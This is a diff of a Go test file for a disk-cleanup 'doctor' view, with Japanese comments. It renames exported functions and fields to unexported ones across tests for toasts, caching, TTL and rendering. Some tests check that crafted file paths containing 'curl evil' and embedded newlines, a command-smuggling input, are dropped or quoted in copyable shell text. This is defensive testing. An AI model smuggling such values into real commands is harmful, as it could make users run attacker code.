@@ -21,12 +21,12 @@ func TestDoctorStartupToast(t *testing.T) {
 	now := time.Date(2026, 9, 2, 12, 0, 0, 0, time.Local)
 	// 🚨 ID は**実在のカタログ ID**にする。トーストはカタログに無い ID を落とすので
 	// (issue 193)、架空の ID だと全件落ちて「常に沈黙」を検証するだけのテストになる
-	big := DoctorDiskCache{ScannedAt: now.Add(-time.Hour), Total: 45 << 30, Entries: []DoctorDiskCacheEntry{
+	big := doctorDiskCache{ScannedAt: now.Add(-time.Hour), Total: 45 << 30, Entries: []doctorDiskCacheEntry{
 		{ID: "xcode-deriveddata", Label: "Xcode", Size: 30 << 30, Status: "ok"},
 		{ID: "npm-cache", Label: "npm", Size: 10 << 30, Status: "ok"},
 		{ID: "go-modcache", Label: "go", Size: 5 << 30, Status: "ok"},
 		{ID: "chrome-tmp", Label: "Chrome", Size: 3 << 30, Status: "blocked"}}}
-	got := DoctorStartupToast(big, true, now)
+	got := doctorStartupToast(big, true, now)
 	for _, want := range []string{"45.0GB 解放できます", "Xcode 30.0GB / npm 10.0GB ほか", "D で doctor を開く"} {
 		if !strings.Contains(got, want) {
 			t.Errorf("%q が無い: %q", want, got)
@@ -35,7 +35,7 @@ func TestDoctorStartupToast(t *testing.T) {
 	if strings.Contains(got, "日前") || strings.Contains(got, "Chrome") {
 		t.Errorf("新しい結果に日数が付いた / blocked が上位に入った: %q", got)
 	}
-	if DoctorStartupToast(DoctorDiskCache{}, false, now) != "" {
+	if doctorStartupToast(doctorDiskCache{}, false, now) != "" {
 		t.Error("結果が無いのにトーストが出た (初回は沈黙する)")
 	}
 	// 🚨 Total だけ下げても効かない: トーストは**合計をエントリから引き直す** (細工した Total を
@@ -43,23 +43,23 @@ func TestDoctorStartupToast(t *testing.T) {
 	small := big
 	// 🚨 **境界は定数から作る**。9GB のような固定値だと、閾値を 10 -> 20GB に動かしても
 	// 「閾値未満なら沈黙」が素通りする (9 は両方の閾値未満なので、変更を検出できない)。
-	small.Entries = []DoctorDiskCacheEntry{{ID: "npm-cache", Label: "npm", Size: DoctorToastThreshold - 1, Status: "ok"}}
-	if got := DoctorStartupToast(small, true, now); got != "" {
+	small.Entries = []doctorDiskCacheEntry{{ID: "npm-cache", Label: "npm", Size: doctorToastThreshold - 1, Status: "ok"}}
+	if got := doctorStartupToast(small, true, now); got != "" {
 		t.Errorf("閾値の 1 バイト下でトーストが出た: %q", got)
 	}
 	atThreshold := big
-	atThreshold.Entries = []DoctorDiskCacheEntry{{ID: "npm-cache", Label: "npm", Size: DoctorToastThreshold, Status: "ok"}}
-	if DoctorStartupToast(atThreshold, true, now) == "" {
+	atThreshold.Entries = []doctorDiskCacheEntry{{ID: "npm-cache", Label: "npm", Size: doctorToastThreshold, Status: "ok"}}
+	if doctorStartupToast(atThreshold, true, now) == "" {
 		t.Error("閾値ちょうどでトーストが出ない (下限は「以上」で判定する)")
 	}
 	recent := big
 	recent.LastNotifiedAt = now.Add(-24 * time.Hour)
-	if DoctorStartupToast(recent, true, now) != "" {
+	if doctorStartupToast(recent, true, now) != "" {
 		t.Error("再通知抑止 (3 日) が効いていない")
 	}
 	old := big
 	old.ScannedAt = now.Add(-10 * 24 * time.Hour)
-	if got := DoctorStartupToast(old, true, now); !strings.Contains(got, "(10 日前の診断)") || !strings.Contains(got, "45.0GB") {
+	if got := doctorStartupToast(old, true, now); !strings.Contains(got, "(10 日前の診断)") || !strings.Contains(got, "45.0GB") {
 		t.Errorf("古い結果でも数字を出し、日数を添える: %q", got)
 	}
 	// issue 174: LastNotifiedAt が未来 (時計を戻した / NTP の大補正 / 別マシンのキャッシュ) だと
@@ -67,14 +67,14 @@ func TestDoctorStartupToast(t *testing.T) {
 	for _, ahead := range []time.Duration{time.Second, doctorToastCooldown, 365 * 24 * time.Hour} {
 		future := big
 		future.LastNotifiedAt = now.Add(ahead)
-		if got := DoctorStartupToast(future, true, now); got == "" {
+		if got := doctorStartupToast(future, true, now); got == "" {
 			t.Errorf("LastNotifiedAt が %v 未来のときトーストが沈黙した", ahead)
 		}
 	}
 	// 境界: ちょうど now のときは cooldown 内 (沈黙)
 	same := big
 	same.LastNotifiedAt = now
-	if DoctorStartupToast(same, true, now) != "" {
+	if doctorStartupToast(same, true, now) != "" {
 		t.Error("LastNotifiedAt == now で cooldown が効いていない")
 	}
 }
@@ -92,10 +92,10 @@ func TestDoctorCacheCorruptAndAtomic(t *testing.T) {
 	if err := os.WriteFile(path, []byte("{broken"), 0o600); err != nil {
 		t.Fatal(err)
 	}
-	if _, ok := LoadDoctorDiskCache(); ok {
+	if _, ok := loadDoctorDiskCache(); ok {
 		t.Error("壊れたキャッシュを読めたことにした")
 	}
-	if err := SaveDoctorDiskCache(DoctorDiskCache{ScannedAt: time.Now(), Total: 1}); err != nil {
+	if err := saveDoctorDiskCache(doctorDiskCache{ScannedAt: time.Now(), Total: 1}); err != nil {
 		t.Fatal(err)
 	}
 	entries, _ := os.ReadDir(filepath.Dir(path))
@@ -104,21 +104,21 @@ func TestDoctorCacheCorruptAndAtomic(t *testing.T) {
 			t.Errorf("一時ファイルが残った: %s", e.Name())
 		}
 	}
-	if _, ok := LoadDoctorDiskCache(); !ok {
+	if _, ok := loadDoctorDiskCache(); !ok {
 		t.Error("保存したキャッシュが読めない")
 	}
-	MarkDoctorNotified(time.Now())
-	if c, _ := LoadDoctorDiskCache(); c.LastNotifiedAt.IsZero() {
+	markDoctorNotified(time.Now())
+	if c, _ := loadDoctorDiskCache(); c.LastNotifiedAt.IsZero() {
 		t.Error("通知時刻が記録されない")
 	}
 	// 中断で壊れた JSON が残らない: 書き込み先が読めないディレクトリだと保存は失敗するが、既存ファイルは無傷
 	if err := os.Chmod(filepath.Dir(path), 0o500); err == nil {
 		t.Cleanup(func() { _ = os.Chmod(filepath.Dir(path), 0o755) })
 		if os.Getuid() != 0 {
-			if err := SaveDoctorDiskCache(DoctorDiskCache{ScannedAt: time.Now(), Total: 2}); err == nil {
+			if err := saveDoctorDiskCache(doctorDiskCache{ScannedAt: time.Now(), Total: 2}); err == nil {
 				t.Error("書けないディレクトリで保存が成功した")
 			}
-			if c, ok := LoadDoctorDiskCache(); !ok || c.Total != 1 {
+			if c, ok := loadDoctorDiskCache(); !ok || c.Total != 1 {
 				t.Errorf("失敗した保存が既存ファイルを壊した: ok=%v %+v", ok, c)
 			}
 		}
@@ -136,27 +136,27 @@ You should find replacements for the following casks:
 
 Warning: Unbrewed header files were found in /usr/local/include.
 `
-	res := ParseBrewDoctor("", stderr, 1)
+	res := parseBrewDoctor("", stderr, 1)
 	if len(res.Warnings) != 2 || !strings.HasPrefix(res.Warnings[0], "Warning: Some installed casks") || !strings.Contains(res.Warnings[0], "  foo") {
 		t.Fatalf("見出し単位にまとまらない: %+v", res)
 	}
 	if strings.Contains(strings.Join(res.Warnings, "\n"), "Please note") {
 		t.Error("定型の前置きが残っている")
 	}
-	if !ParseBrewDoctor("Your system is ready to brew.\n", "", 0).Clean {
+	if !parseBrewDoctor("Your system is ready to brew.\n", "", 0).Clean {
 		t.Error("警告なしが Clean にならない")
 	}
 	// stdout に警告、stderr は前置きだけ → 両方連結して読む (片方だけ選ぶと警告を落とす)
-	if res := ParseBrewDoctor("Warning: X\n", "Please note that these warnings are just used to help\n", 1); len(res.Warnings) != 1 {
+	if res := parseBrewDoctor("Warning: X\n", "Please note that these warnings are just used to help\n", 1); len(res.Warnings) != 1 {
 		t.Errorf("stdout の警告を落とした: %+v", res)
 	}
-	if ParseBrewDoctor("", "", 1).Unavailable == "" {
+	if parseBrewDoctor("", "", 1).Unavailable == "" {
 		t.Error("非 0 で本文なしを診断できずにしない (0 件に畳んでいる)")
 	}
-	if res := ParseBrewDoctor("", "Error: Homebrew must be run under Ruby 3.4\n", 1); res.Unavailable == "" || !strings.Contains(res.Unavailable, "Error: Homebrew") {
+	if res := parseBrewDoctor("", "Error: Homebrew must be run under Ruby 3.4\n", 1); res.Unavailable == "" || !strings.Contains(res.Unavailable, "Error: Homebrew") {
 		t.Errorf("Error: 行を警告扱いにした: %+v", res)
 	}
-	if res := ParseBrewDoctor("", "Warning: rc0 でも警告\n", 0); len(res.Warnings) != 1 {
+	if res := parseBrewDoctor("", "Warning: rc0 でも警告\n", 0); len(res.Warnings) != 1 {
 		t.Errorf("rc=0 で stderr に Warning があるのに Clean にした: %+v", res)
 	}
 	if runBrewDoctor(context.Background(), func(context.Context, string, ...string) (string, string, int, error) {
@@ -177,7 +177,7 @@ func TestDoctorStartupToastThroughRealPath(t *testing.T) {
 		{Entry: disk.Entry{ID: "go-modcache", Label: "壊れた", Risk: disk.RiskSafe}, Status: disk.StatusFailed, Size: 99 << 30, Reason: "走査できず"},
 		{Entry: disk.Entry{ID: "swiftpm-cache", Label: "空"}, Status: disk.StatusOK},
 	}}
-	c := DoctorCacheFromReport(rep, DoctorDiskCache{})
+	c := doctorCacheFromReport(rep, doctorDiskCache{})
 
 	// 候補 0 件の ok エントリは持たない。失敗したものは (数字を出さないために) 落とさず status で区別する
 	for _, e := range c.Entries {
@@ -185,7 +185,7 @@ func TestDoctorStartupToastThroughRealPath(t *testing.T) {
 			t.Error("候補 0 件のエントリをキャッシュに持っている")
 		}
 	}
-	got := DoctorStartupToast(c, true, now)
+	got := doctorStartupToast(c, true, now)
 	for _, want := range []string{"30.0GB 解放できます", "Xcode 20.0GB", "npm 10.0GB", "D で doctor を開く"} {
 		if !strings.Contains(got, want) {
 			t.Errorf("トーストに %q が無い: %q", want, got)
@@ -196,17 +196,17 @@ func TestDoctorStartupToastThroughRealPath(t *testing.T) {
 		t.Errorf("走査できなかったエントリがトーストに出た: %q", got)
 	}
 	// cooldown 内は沈黙し、明けたら出る。未来の記録 (時計を戻した) でも沈黙し続けない
-	if s := DoctorStartupToast(c, true, now.Add(time.Hour)); s != "" {
+	if s := doctorStartupToast(c, true, now.Add(time.Hour)); s != "" {
 		_ = s // cooldown は LastNotifiedAt が空なので出る側。ここでは c を使い回さない
 	}
 	c2 := c
 	c2.LastNotifiedAt = now.Add(-1 * time.Hour)
-	if s := DoctorStartupToast(c2, true, now); s != "" {
+	if s := doctorStartupToast(c2, true, now); s != "" {
 		t.Errorf("cooldown 内なのにトーストが出た: %q", s)
 	}
 	c3 := c
 	c3.LastNotifiedAt = now.Add(-8 * 24 * time.Hour)
-	if s := DoctorStartupToast(c3, true, now); s == "" {
+	if s := doctorStartupToast(c3, true, now); s == "" {
 		t.Error("cooldown が明けてもトーストが出ない")
 	}
 }
@@ -217,20 +217,20 @@ func TestDoctorStartupToastReportsUndiagnosed(t *testing.T) {
 	// 閾値を超えているときは合計に添える
 	// 🚨 Total / Failed は**エントリから導出される値**なので、手で設定するだけでは効かない
 	// (トーストが引き直す。細工した doctor-disk.json を信用しないため。issue 193)。
-	// production の DoctorCacheFromReport も failed エントリを Entries に入れて数えるので、
+	// production の doctorCacheFromReport も failed エントリを Entries に入れて数えるので、
 	// fixture もその形にする (Entries と整合しない Failed は実経路では起こらない)
-	big := DoctorDiskCache{ScannedAt: now.Add(-time.Hour), Entries: []DoctorDiskCacheEntry{
+	big := doctorDiskCache{ScannedAt: now.Add(-time.Hour), Entries: []doctorDiskCacheEntry{
 		{ID: "xcode-deriveddata", Label: "Xcode", Size: 45 << 30, Status: "ok"},
 		{ID: "npm-cache", Label: "npm", Status: "failed"},
 		{ID: "go-modcache", Label: "go", Status: "failed"}}}
-	if got := DoctorStartupToast(big, true, now); !strings.Contains(got, "2 件は診断できず") {
+	if got := doctorStartupToast(big, true, now); !strings.Contains(got, "2 件は診断できず") {
 		t.Errorf("診断できずの件数が添えられない: %q", got)
 	}
 	// 閾値未満でも、診断できずが在れば黙らない
 	small := big
-	small.Entries = append([]DoctorDiskCacheEntry{{ID: "xcode-deriveddata", Label: "Xcode", Size: 1 << 30, Status: "ok"}},
+	small.Entries = append([]doctorDiskCacheEntry{{ID: "xcode-deriveddata", Label: "Xcode", Size: 1 << 30, Status: "ok"}},
 		big.Entries[1:]...) // ok を小さくし、failed 2 件はそのまま
-	got := DoctorStartupToast(small, true, now)
+	got := doctorStartupToast(small, true, now)
 	if !strings.Contains(got, "2 件を診断できませんでした") || !strings.Contains(got, "D で doctor を開く") {
 		t.Errorf("閾値未満 + 診断できずで沈黙した: %q", got)
 	}
@@ -238,13 +238,13 @@ func TestDoctorStartupToastReportsUndiagnosed(t *testing.T) {
 	// Failed は導出値なので、failed のエントリごと外す
 	quiet := small
 	quiet.Entries = quiet.Entries[:1]
-	if s := DoctorStartupToast(quiet, true, now); s != "" {
+	if s := doctorStartupToast(quiet, true, now); s != "" {
 		t.Errorf("閾値未満で余計なトーストが出た: %q", s)
 	}
 	// cooldown は「診断できず」のトーストにも効く
 	cooled := small
 	cooled.LastNotifiedAt = now.Add(-time.Hour)
-	if s := DoctorStartupToast(cooled, true, now); s != "" {
+	if s := doctorStartupToast(cooled, true, now); s != "" {
 		t.Errorf("診断できずのトーストが cooldown を無視した: %q", s)
 	}
 }
@@ -253,10 +253,10 @@ func TestDoctorStartupToastReportsUndiagnosed(t *testing.T) {
 // トーストの上位が変わる)。敵対レビュー 2026-09-03: 並び替えを消しても全テストが green だった。
 func TestDoctorCacheEntriesAreSortedBySize(t *testing.T) {
 	now := time.Now()
-	prev := DoctorDiskCache{ScannedAt: now, Entries: []DoctorDiskCacheEntry{
+	prev := doctorDiskCache{ScannedAt: now, Entries: []doctorDiskCacheEntry{
 		{ID: "carried", Label: "Carried", Size: 20 << 30, Status: "ok", MeasuredAt: now},
 	}}
-	c := DoctorCacheFromReport(disk.Report{ScannedAt: now, Partial: true, Results: []disk.Result{
+	c := doctorCacheFromReport(disk.Report{ScannedAt: now, Partial: true, Results: []disk.Result{
 		{Entry: disk.Entry{ID: "small", Label: "Small"}, Status: disk.StatusOK, Size: 1 << 30, MeasuredAt: now,
 			Items: []disk.Item{{Path: "/s", Size: 1 << 30}}},
 		{Entry: disk.Entry{ID: "huge", Label: "Huge"}, Status: disk.StatusOK, Size: 40 << 30, MeasuredAt: now,
@@ -277,7 +277,7 @@ func TestDoctorCacheEntriesAreSortedBySize(t *testing.T) {
 
 // carry-forward の TTL が依拠する時刻そのものを、書き込み側で不変条件にする (issue 194)。
 //
-// 172 で DoctorCarryTTL を入れて「今回実測していないエントリの無期限延命」を塞いだが、
+// 172 で doctorCarryTTL を入れて「今回実測していないエントリの無期限延命」を塞いだが、
 // TTL が見る MeasuredAt の正しさは誰も守っていなかった。2 つの経路で同じ延命に戻る:
 //
 //	(a) 極端に未来の MeasuredAt (RTC 故障 / 不正な NTP) では age が永久に負のまま
@@ -295,16 +295,16 @@ func TestDoctorCarryTTLClampsMeasuredAt(t *testing.T) {
 		}}}
 	}
 	// Esc (partial) を n 回繰り返す。partial は「前回の記録に重ねる」経路なので carry が効く
-	carryRounds := func(c DoctorDiskCache, start time.Time, step time.Duration, n int) DoctorDiskCache {
+	carryRounds := func(c doctorDiskCache, start time.Time, step time.Duration, n int) doctorDiskCache {
 		for i := 1; i <= n; i++ {
-			c = DoctorCacheFromReport(disk.Report{ScannedAt: start.Add(time.Duration(i) * step), Partial: true}, c)
+			c = doctorCacheFromReport(disk.Report{ScannedAt: start.Add(time.Duration(i) * step), Partial: true}, c)
 		}
 		return c
 	}
 
 	// (a) 100 年後を指す MeasuredAt でも TTL 相当で失効する。
 	// 書き込み時に頭打ちにするので、キャッシュに残る時刻は走査時刻を超えない
-	future := DoctorDiskCache{ScannedAt: base, Entries: []DoctorDiskCacheEntry{
+	future := doctorDiskCache{ScannedAt: base, Entries: []doctorDiskCacheEntry{
 		{ID: "heavy", Label: "H", Size: 44 << 30, Status: "ok", MeasuredAt: base.AddDate(100, 0, 0)},
 	}}
 	// 1 回目の partial で頭打ちが効く (この時点ではまだ TTL 内なので引き継がれる)
@@ -316,7 +316,7 @@ func TestDoctorCarryTTLClampsMeasuredAt(t *testing.T) {
 		t.Errorf("未来の MeasuredAt が頭打ちにされていない: %v", got)
 	}
 	// その後 TTL を超えれば失効する (100 年後のままなら永久に生き残る)
-	c = carryRounds(c, base.Add(time.Hour), DoctorCarryTTL+time.Hour, 1)
+	c = carryRounds(c, base.Add(time.Hour), doctorCarryTTL+time.Hour, 1)
 	if len(c.Entries) != 0 {
 		t.Errorf("未来の MeasuredAt を持つエントリが TTL を超えても失効しない: %+v", c.Entries)
 	}
@@ -324,7 +324,7 @@ func TestDoctorCarryTTLClampsMeasuredAt(t *testing.T) {
 	// (b) TTL より短い間隔を何ラウンド重ねても、真の経過が TTL を超えたら失効する。
 	// 🚨 1 ラウンドでは検出できない: 10h は TTL 内なので carry されるのが正しい。
 	// MeasuredAt を書かない実装だと、毎回「前回保存からの 10h」しか見ずに永久に生き残る
-	fresh := DoctorCacheFromReport(heavy(base, base), DoctorDiskCache{})
+	fresh := doctorCacheFromReport(heavy(base, base), doctorDiskCache{})
 	if len(fresh.Entries) != 1 || fresh.Entries[0].MeasuredAt.IsZero() {
 		t.Fatalf("実測したエントリに MeasuredAt が書かれていない: %+v", fresh.Entries)
 	}
@@ -339,7 +339,7 @@ func TestDoctorCarryTTLClampsMeasuredAt(t *testing.T) {
 
 	// (c) 保存されるのは「走査した時刻」ではなく「実測した時刻」。
 	// 再利用した計測値を含む走査では両者がずれるので、走査時刻を書くと鮮度を過大評価する
-	stale := DoctorCacheFromReport(heavy(base, base.Add(-20*time.Hour)), DoctorDiskCache{})
+	stale := doctorCacheFromReport(heavy(base, base.Add(-20*time.Hour)), doctorDiskCache{})
 	if len(stale.Entries) != 1 {
 		t.Fatalf("エントリが書かれていない: %+v", stale.Entries)
 	}
@@ -388,19 +388,19 @@ func TestDoctorRestoredValuesAreValidated(t *testing.T) {
 	if p := diskCopyPath(rs[0]); strings.Contains(p, "curl evil") || strings.Contains(p, "\n\n") {
 		t.Errorf("y のコピー文に細工した Path が出た: %q", p)
 	}
-	if txt := DiskCopyText(rs[0], "✅ 安全"); strings.Contains(txt, "curl evil") {
+	if txt := diskCopyText(rs[0], "✅ 安全"); strings.Contains(txt, "curl evil") {
 		t.Errorf("Y のコピー文に細工した Path が出た:\n%s", txt)
 	}
 
 	// (2) doctor-disk.json (起動トースト用) も同じ境界を通す。
 	// カタログに無い ID / 未知の Status / 負サイズ / 埋め込み改行を落とし、合計を引き直す
-	c := DoctorDiskCache{ScannedAt: now, Total: 999 << 30, Failed: 9, Entries: []DoctorDiskCacheEntry{
+	c := doctorDiskCache{ScannedAt: now, Total: 999 << 30, Failed: 9, Entries: []doctorDiskCacheEntry{
 		{ID: "gone-id", Label: "カタログに無い\n偽エントリ", Size: 99 << 30, Status: "ok"},
 		{ID: "npm-cache", Label: "未知の status", Size: 88 << 30, Status: "weird-status"},
 		{ID: "go-modcache", Label: "負サイズ", Size: -1, Status: "ok"},
 		{ID: "xcode-deriveddata", Label: "正当\nな行", Size: 45 << 30, Status: "ok"},
 	}}
-	got := DoctorStartupToast(c, true, now)
+	got := doctorStartupToast(c, true, now)
 	for _, ng := range []string{"偽エントリ", "未知の status", "負サイズ", "999", "88.0GB", "99.0GB"} {
 		if strings.Contains(got, ng) {
 			t.Errorf("落とすべき値がトーストに出た (%q): %q", ng, got)
@@ -418,7 +418,7 @@ func TestDoctorRestoredValuesAreValidated(t *testing.T) {
 	}
 }
 
-// DoctorReuseFrom は MeasuredAt がゼロ値の Result を再利用しない。
+// doctorReuseFrom は MeasuredAt がゼロ値の Result を再利用しない。
 //
 // 🚨 このガードは **TTL 判定では代替できない**。TestDoctorReusesHeavyEntries の "nomeasure" は
 // now が実時刻なので「ゼロ値との差 = 約 56 年 >= TTL」で弾かれ、`IsZero()` を外しても green の
@@ -431,8 +431,8 @@ func TestDoctorReuseSkipsZeroMeasuredAtNearEpoch(t *testing.T) {
 	//    (最初にそう書いて変異が green のままだった)。ゼロ値そのものから 30 分後を now にする。
 	now := time.Time{}.Add(30 * time.Minute) // ゼロ値との差 30 分 = TTL (1 時間) の内側
 	zero := disk.Result{Entry: disk.Entry{ID: "thing"}, Status: disk.StatusOK, Elapsed: 3 * time.Second}
-	sn := DoctorSnapshot{ScannedAt: now, Disk: disk.Report{Results: []disk.Result{zero}}}
-	if reuse := DoctorReuseFrom(sn, true, now); reuse != nil {
+	sn := doctorSnapshot{ScannedAt: now, Disk: disk.Report{Results: []disk.Result{zero}}}
+	if reuse := doctorReuseFrom(sn, true, now); reuse != nil {
 		if got := reuse(disk.Entry{ID: "thing"}); got != nil {
 			t.Fatalf("MeasuredAt ゼロ値を再利用した: %+v", got)
 		}
@@ -442,7 +442,7 @@ func TestDoctorReuseSkipsZeroMeasuredAtNearEpoch(t *testing.T) {
 	ok := zero
 	ok.MeasuredAt = now.Add(-10 * time.Minute)
 	sn.Disk = sn.Disk.WithResults([]disk.Result{ok})
-	reuse := DoctorReuseFrom(sn, true, now)
+	reuse := doctorReuseFrom(sn, true, now)
 	if reuse == nil {
 		t.Fatal("実在する MeasuredAt でも再利用関数を返さない")
 	}
@@ -469,28 +469,28 @@ func TestDoctorCopyTextCarriesVerifyCommands(t *testing.T) {
 		"xctest-logarchive":          "sysctl kern.boottime",
 	} {
 		r := disk.Result{Entry: disk.Entry{ID: id, Label: id}, Status: disk.StatusOK}
-		got := DiskCopyText(r, "✅ 安全")
+		got := diskCopyText(r, "✅ 安全")
 		if !strings.Contains(got, want) {
 			t.Errorf("%s のコピー文に %q が無い:\n%s", id, want, got)
 		}
 	}
 
 	// 🚨 mdfind は出さない (カタログが「使わない」と明記した判定材料。issue 148)
-	if got := DiskCopyText(disk.Result{Entry: disk.Entry{ID: "orphan-container"}}, "⛔"); strings.Contains(got, "mdfind") {
+	if got := diskCopyText(disk.Result{Entry: disk.Entry{ID: "orphan-container"}}, "⛔"); strings.Contains(got, "mdfind") {
 		t.Errorf("否定された判定材料 (mdfind) をコピー文に出した:\n%s", got)
 	}
 
 	// 既存出力と重複するコマンドを足していないこと (Item のサイズと最終更新は既に出ている)
 	npm := disk.Result{Entry: disk.Entry{ID: "npm-cache"}, Status: disk.StatusOK,
 		Items: []disk.Item{{Path: "/h/.npm", Size: 100}}}
-	if got := DiskCopyText(npm, "✅"); strings.Contains(got, "du -sk") || strings.Contains(got, "stat -f") {
+	if got := diskCopyText(npm, "✅"); strings.Contains(got, "du -sk") || strings.Contains(got, "stat -f") {
 		t.Errorf("既存出力と重複するコマンドを足した:\n%s", got)
 	}
 
 	// (2) disk: Inspect 系はパスごとに ls を出し、**引用する**
 	drag := disk.Result{Entry: disk.Entry{ID: "swiftui-drag-cache"}, Status: disk.StatusOK,
 		Items: []disk.Item{{Path: "/tmp/" + evil, Size: 1}}}
-	got := DiskCopyText(drag, "⛔ 要確認")
+	got := diskCopyText(drag, "⛔ 要確認")
 	if !strings.Contains(got, "ls -la ") {
 		t.Errorf("Inspect 系に ls が無い:\n%s", got)
 	}
@@ -505,7 +505,7 @@ func TestDoctorCopyTextCarriesVerifyCommands(t *testing.T) {
 		manyItems = append(manyItems, disk.Item{Path: fmt.Sprintf("/tmp/x%d", i), Size: 1})
 	}
 	many = many.WithItems(manyItems)
-	if n := strings.Count(DiskCopyText(many, "⛔"), "ls -la "); n > maxVerifyCommands {
+	if n := strings.Count(diskCopyText(many, "⛔"), "ls -la "); n > maxVerifyCommands {
 		t.Errorf("裏取りコマンドが上限 %d を超えた: %d 本", maxVerifyCommands, n)
 	}
 
@@ -534,8 +534,8 @@ func TestDoctorCopyTextCarriesVerifyCommands(t *testing.T) {
 // **値を書き換えても緑のまま通る**。値は製品判断 (issue 218 で 10 -> 20GB) なので、
 // 変えるときはこのテストを直す = 意図的な編集であることを残す。
 func TestDoctorToastThresholdAndCooldownArePinned(t *testing.T) {
-	if want := int64(20) << 30; DoctorToastThreshold != want {
-		t.Errorf("起動時トーストの閾値が %d (期待 %d = 20GB)。変更は issue 218 の判断を更新してから", DoctorToastThreshold, want)
+	if want := int64(20) << 30; doctorToastThreshold != want {
+		t.Errorf("起動時トーストの閾値が %d (期待 %d = 20GB)。変更は issue 218 の判断を更新してから", doctorToastThreshold, want)
 	}
 	if want := 3 * 24 * time.Hour; doctorToastCooldown != want {
 		t.Errorf("再通知の抑止期間が %v (期待 %v)。閾値と対で見ること (低い閾値 + 短い抑止 = 鳴り続ける)", doctorToastCooldown, want)
@@ -566,7 +566,7 @@ func TestDoctorRiskMarkDelegatesWordAndAddsColor(t *testing.T) {
 		{"caution", disk.Result{Entry: disk.Entry{ID: "e", Risk: disk.RiskCaution}, Status: disk.StatusOK, Items: item}, term.AnsiYellow},
 		{"confirm", disk.Result{Entry: disk.Entry{ID: "e", Risk: disk.RiskConfirm}, Status: disk.StatusOK, Items: item}, term.AnsiRed},
 	} {
-		word, color := DoctorRiskMark(tc.r)
+		word, color := doctorRiskMark(tc.r)
 		if want := disk.Mark(tc.r); word != want {
 			t.Errorf("%s: 語が出典と違う: %q; want %q (disk.Mark へ委譲すること)", tc.name, word, want)
 		}
@@ -581,11 +581,11 @@ func TestDoctorRiskMarkDelegatesWordAndAddsColor(t *testing.T) {
 // 同じ結果になる形にすると、別名が消えても緑のまま通る)。
 func TestDoctorListHomeEndAreAliasesOfGG(t *testing.T) {
 	land := func(keys ...string) int {
-		v := &DoctorView{Rows: rows("", "a", "b", "c")}
+		v := &DoctorView{rows: rows("", "a", "b", "c")}
 		for _, k := range keys {
 			v.HandleKey(k, 20)
 		}
-		return v.Cur.Index
+		return v.cur.index
 	}
 	top, bottom := land("g"), land("G")
 	if top == bottom {
@@ -603,8 +603,8 @@ func TestDoctorListHomeEndAreAliasesOfGG(t *testing.T) {
 // 🚨 doctor の描画テストは全部 width 100 固定で、182 が入れた縮退経路が一度も走っていなかった。
 // ここは狭い幅を掃いて、最長マーク「❓ 走査できず」(幅 13) が切れないことを固定する。
 func TestDoctorDiskRowFitsWidthIncludingGutter(t *testing.T) {
-	v := &DoctorView{Shown: true, Expanded: map[RowKey]bool{}}
-	v.DiskRep = &disk.Report{Results: []disk.Result{
+	v := &DoctorView{shown: true, expanded: map[rowKey]bool{}}
+	v.diskRep = &disk.Report{Results: []disk.Result{
 		{Entry: disk.Entry{ID: "a", Label: "とても長いラベルのエントリ名前", Risk: disk.RiskSafe, DeleteVia: "rm"},
 			Status: disk.StatusFailed, Reason: "権限がありません"},
 		{Entry: disk.Entry{ID: "b", Label: "別の長いラベル", Risk: disk.RiskConfirm, DeleteVia: "trash"},
@@ -612,7 +612,7 @@ func TestDoctorDiskRowFitsWidthIncludingGutter(t *testing.T) {
 	}}
 	// 走査が終わった状態にする (scanning のヘッダは経過時間を出すので、起点を置かないと
 	// 現実に出ない長さの行になり、測りたい行ではなくヘッダで落ちる)
-	v.SvcRep, v.Brew = &svc.Report{}, &BrewDoctorResult{Clean: true}
+	v.svcRep, v.brew = &svc.Report{}, &brewDoctorResult{Clean: true}
 	// 🚨 「行が幅を超えない」だけを見ても**発火しない**: lines() が毎行 term.TruncateDisp で切るので、
 	// 予算を誤っても溢れずに**中身が切れる**だけ (敵対レビュー 2026-09-04 の P3)。
 	// 見るのは「最長マークが切れずに残るか」= 予算が正しいかそのもの
@@ -654,11 +654,11 @@ func TestDoctorMarkWidthCoversVocabulary(t *testing.T) {
 // タブ分割後、節は表示中のタブのものしか出ないので、「どこかに出ているか」を見るテストは
 // これを使う (操作を検査するテストは v.tab を明示して 1 タブだけ描くこと)。
 func doctorTextAllTabs(v *DoctorView, page int) string {
-	old := v.Tab
-	defer func() { v.Tab = old }()
+	old := v.tab
+	defer func() { v.tab = old }()
 	var b strings.Builder
-	for t := DoctorTab(0); t < NumDoctorTabs; t++ {
-		v.Tab = t
+	for t := DoctorTab(0); t < numDoctorTabs; t++ {
+		v.tab = t
 		b.WriteString(strings.Join(v.Lines(testOpts(page)), "\n") + "\n")
 	}
 	return b.String()
@@ -669,9 +669,9 @@ func doctorTextAllTabs(v *DoctorView, page int) string {
 // そこを作らずに書いたテストは何も守らない (issues/170)。
 func doctorFirstDiskEvent(t *testing.T, v *DoctorView) {
 	t.Helper()
-	for _, sub := range v.Open()().(tea.BatchMsg) {
-		if msg, ok := sub().(DoctorDiskMsg); ok && msg.Ev.R != nil {
-			v.ReceiveDisk(msg)
+	for _, sub := range v.open()().(tea.BatchMsg) {
+		if msg, ok := sub().(doctorDiskMsg); ok && msg.ev.r != nil {
+			v.receiveDisk(msg)
 			return
 		}
 	}
@@ -681,7 +681,7 @@ func doctorFirstDiskEvent(t *testing.T, v *DoctorView) {
 // 全画面 viewer の契約: どの状態でもちょうど page 行、どの行も width を超えない。
 func TestDoctorLinesFillsPage(t *testing.T) {
 	v := testView(t)
-	cmd := v.Open()
+	cmd := v.open()
 	check := func(name string) {
 		for _, page := range []int{40, 12, 4, 1} {
 			o := testOpts(page)
@@ -724,10 +724,10 @@ func TestDoctorLinesFillsPage(t *testing.T) {
 // Enter で選んだ行の詳細をインライン展開し、もう一度で畳む。カーソルは選べる行だけに止まる。
 func TestDoctorCursorAndExpand(t *testing.T) {
 	v := testView(t)
-	runCmds(t, v, v.Open())
+	runCmds(t, v, v.open())
 	_ = v.Lines(testOpts(40))
-	if !v.Rows[v.Cur.Index].Selectable || !strings.Contains(v.Rows[v.Cur.Index].Text, "Thing キャッシュ") {
-		t.Fatalf("初期カーソルが最初の選べる行 (ディスク 1 件目) にない: %q", v.Rows[v.Cur.Index].Text)
+	if !v.rows[v.cur.index].selectable || !strings.Contains(v.rows[v.cur.index].text, "Thing キャッシュ") {
+		t.Fatalf("初期カーソルが最初の選べる行 (ディスク 1 件目) にない: %q", v.rows[v.cur.index].text)
 	}
 	v.HandleKey("enter", 40)
 	out := testText(v, 40)
@@ -741,12 +741,12 @@ func TestDoctorCursorAndExpand(t *testing.T) {
